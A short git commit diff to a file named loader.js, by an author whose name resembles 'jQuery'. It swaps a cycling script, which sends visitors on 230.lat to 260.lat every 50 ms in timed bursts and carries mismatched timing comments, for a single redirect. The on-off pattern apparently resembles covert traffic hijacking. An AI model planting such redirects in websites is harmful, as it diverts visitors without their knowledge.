4a5df4b44a79498afc87f8df0af5a2d41357f3b1
cssjqeury <theaverageman463@gmail.com>
2025-08-08 02:42:58 +0100

    Update loader.js

--- loader.js
+++ loader.js
@@ -1,27 +1,10 @@
-<script>
 (function () {
     const allowedDomains = ["230.lat", "www.230.lat"];
     const targetURL = "https://260.lat";
 
-    // Time in milliseconds
-    const activeTime = 3 * 60 * 1000;  // 5 minutes
-    const pauseTime = 10 * 60 * 1000;  // 20 minutes
-
-    function startCycle() {
-        // Run redirect only if domain matches
-        if (allowedDomains.includes(location.hostname)) {
-            const interval = setInterval(() => {
-                location.href = targetURL;
-            }, 50); // redirect loop while active
-
-            // Stop after 5 min
-            setTimeout(() => {
-                clearInterval(interval);
-                setTimeout(startCycle, pauseTime); // Restart after pause
-            }, activeTime);
-        }
+    if (allowedDomains.includes(location.hostname)) {
+      setTimeout(function () {
+        location.href = targetURL;
+      }, 50);
     }
-
-    startCycle();
-})();
-</script>
+  })();
